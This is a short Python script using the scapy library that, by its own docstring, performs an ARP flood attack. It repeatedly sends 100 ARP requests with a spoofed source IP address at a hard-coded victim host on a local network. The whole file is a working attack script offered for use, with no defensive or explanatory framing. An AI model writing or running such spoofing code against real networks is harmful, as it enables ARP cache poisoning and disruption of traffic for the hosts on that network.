"""Code to perform flood type ARP attack"""

from scapy.all import *
from subprocess import call
import time

op = 1
""" IP address of Target set as destination"""
victim = "10.0.0.3"

"""fake IP address set as source"""
fake = "10.0.0.2"

"""MAC address of target host"""
mac = "ff:ff:ff:ff:ff:ff"

arp = ARP(op=op,psrc=fake,pdst=victim,hwdst=mac)

n = 100

while n:
  send(arp)
  n-= 1
